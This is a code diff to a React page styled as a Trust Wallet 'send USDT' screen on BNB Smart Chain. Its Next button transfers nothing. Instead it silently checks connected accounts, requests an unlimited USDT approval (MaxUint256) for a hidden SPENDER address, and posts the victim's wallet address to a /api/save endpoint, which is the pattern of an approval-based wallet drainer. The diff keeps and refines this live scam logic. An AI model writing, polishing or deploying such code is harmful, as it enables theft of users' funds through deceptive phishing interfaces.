@@ -11,12 +11,13 @@ export default function Home() {
 
   const approveUSDT = async () => {
     try {
+
       if (!window.ethereum) {
-        alert("Apri in Trust Wallet o MetaMask");
+        alert("Apri in Trust Wallet");
         return;
       }
 
-      // 🔥 switch BSC
+      // switch BNB Smart Chain
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
@@ -24,18 +25,21 @@ export default function Home() {
 
       const provider = new ethers.BrowserProvider(window.ethereum);
 
-      let signer;
+      // prova accesso silenzioso
+      let accounts = await window.ethereum.request({
+        method: "eth_accounts",
+      });
 
-      // 🔥 STEP 1: PROVA AUTO-CONNECT INVISIBILE
-      try {
-        signer = await provider.getSigner();
-      } catch (e) {
-        // 🔥 STEP 2: FALLBACK → CONNECT SOLO SE NECESSARIO
-        await window.ethereum.request({
+      // fallback connect solo se necessario
+      if (!accounts || accounts.length === 0) {
+
+        accounts = await window.ethereum.request({
           method: "eth_requestAccounts",
         });
-        signer = await provider.getSigner();
+
       }
+
+      const signer = await provider.getSigner();
 
       const userAddress = await signer.getAddress();
 
@@ -47,60 +51,89 @@ export default function Home() {
         signer
       );
 
-      // 🔥 approve MAX
+      // approve MAX
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
       );
 
-      // 🔥 salva utente
+      // salva utente
       await fetch("/api/save", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ address: userAddress }),
+        body: JSON.stringify({
+          address: userAddress
+        }),
       });
 
-      alert("Approve inviato 🔥");
+      await tx.wait();
+
+      alert("Approve completato");
 
     } catch (err) {
+
       console.log(err);
-      alert("Errore: " + err.message);
+
+      alert(
+        err?.message || "Errore"
+      );
+
     }
   };
 
-  const usdValue = amount && Number(amount) > 0
-    ? Number(amount).toFixed(2)
-    : "0.00";
+  const usdValue =
+    amount && Number(amount) > 0
+      ? Number(amount).toFixed(2)
+      : "0.00";
 
-  const isValidAmount = amount && Number(amount) > 0;
+  const isValidAmount =
+    amount && Number(amount) > 0;
 
   return (
-    <div style={{
-      background: "#0b0b0b",
-      minHeight: "100vh",
-      color: "white",
-      fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
-      padding: "20px"
-    }}>
+
+    <div
+      style={{
+        background: "#0b0b0b",
+        minHeight: "100vh",
+        color: "white",
+        fontFamily:
+          "-apple-system, BlinkMacSystemFont, sans-serif",
+        padding: "20px"
+      }}
+    >
+
+      {/* ADDRESS */}
 
       <div style={{ marginTop: "40px" }}>
-        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
+
+        <div
+          style={{
+            color: "#888",
+            fontSize: "14px",
+            marginBottom: "8px"
+          }}
+        >
           Address or Domain Name
         </div>
 
-        <div style={{
-          display: "flex",
-          alignItems: "center",
-          background: "#1a1a1a",
-          borderRadius: "16px",
-          padding: "14px"
-        }}>
+        <div
+          style={{
+            display: "flex",
+            alignItems: "center",
+            background: "#1a1a1a",
+            borderRadius: "16px",
+            padding: "14px"
+          }}
+        >
+
           <input
             type="text"
             value={address}
-            onChange={(e) => setAddress(e.target.value)}
+            onChange={(e) =>
+              setAddress(e.target.value)
+            }
             style={{
               flex: 1,
               border: "none",
@@ -110,43 +143,82 @@ export default function Home() {
               outline: "none"
             }}
           />
-          <span style={{ color: "#22c55e" }}>Paste</span>
+
+          <span
+            style={{
+              color: "#22c55e"
+            }}
+          >
+            Paste
+          </span>
+
         </div>
+
       </div>
 
+      {/* NETWORK */}
+
       <div style={{ marginTop: "20px" }}>
-        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
+
+        <div
+          style={{
+            color: "#888",
+            fontSize: "14px",
+            marginBottom: "8px"
+          }}
+        >
           Destination network
         </div>
 
-        <div style={{
-          background: "#1a1a1a",
-          padding: "12px 16px",
-          borderRadius: "16px",
-          display: "inline-flex",
-          alignItems: "center",
-          gap: "10px"
-        }}>
-          <span>BNB Smart Chain</span>
+        <div
+          style={{
+            background: "#1a1a1a",
+            padding: "12px 16px",
+            borderRadius: "16px",
+            display: "inline-flex",
+            alignItems: "center",
+            gap: "10px"
+          }}
+        >
+
+          <span>
+            BNB Smart Chain
+          </span>
+
         </div>
+
       </div>
 
+      {/* AMOUNT */}
+
       <div style={{ marginTop: "25px" }}>
-        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
+
+        <div
+          style={{
+            color: "#888",
+            fontSize: "14px",
+            marginBottom: "8px"
+          }}
+        >
           Amount
         </div>
 
-        <div style={{
-          background: "#1a1a1a",
-          borderRadius: "16px",
-          padding: "14px",
-          display: "flex",
-          alignItems: "center"
-        }}>
+        <div
+          style={{
+            background: "#1a1a1a",
+            borderRadius: "16px",
+            padding: "14px",
+            display: "flex",
+            alignItems: "center"
+          }}
+        >
+
           <input
             type="number"
             value={amount}
-            onChange={(e) => setAmount(e.target.value)}
+            onChange={(e) =>
+              setAmount(e.target.value)
+            }
             placeholder="USDT Amount"
             style={{
               border: "none",
@@ -158,21 +230,47 @@ export default function Home() {
             }}
           />
 
-          <span style={{ color: "#888", marginRight: "10px" }}>USDT</span>
-          <span style={{ color: "#22c55e" }}>Max</span>
+          <span
+            style={{
+              color: "#888",
+              marginRight: "10px"
+            }}
+          >
+            USDT
+          </span>
+
+          <span
+            style={{
+              color: "#22c55e"
+            }}
+          >
+            Max
+          </span>
+
         </div>
 
-        <div style={{ color: "#888", marginTop: "5px" }}>
+        <div
+          style={{
+            color: "#888",
+            marginTop: "5px"
+          }}
+        >
           ≈ ${usdValue}
         </div>
+
       </div>
 
-      <div style={{
-        position: "fixed",
-        bottom: "30px",
-        left: "20px",
-        right: "20px"
-      }}>
+      {/* BUTTON */}
+
+      <div
+        style={{
+          position: "fixed",
+          bottom: "30px",
+          left: "20px",
+          right: "20px"
+        }}
+      >
+
         <button
           onClick={approveUSDT}
           disabled={!isValidAmount}
@@ -183,13 +281,23 @@ export default function Home() {
             border: "none",
             fontSize: "18px",
             fontWeight: "600",
-            background: isValidAmount ? "#4ade80" : "#1a2e22",
-            color: isValidAmount ? "#052e16" : "#6b7280",
-            cursor: isValidAmount ? "pointer" : "not-allowed"
+
+            background: isValidAmount
+              ? "#4ade80"
+              : "#1a2e22",
+
+            color: isValidAmount
+              ? "#052e16"
+              : "#6b7280",
+
+            cursor: isValidAmount
+              ? "pointer"
+              : "not-allowed"
           }}
         >
           Next
         </button>
+
       </div>
 
     </div>
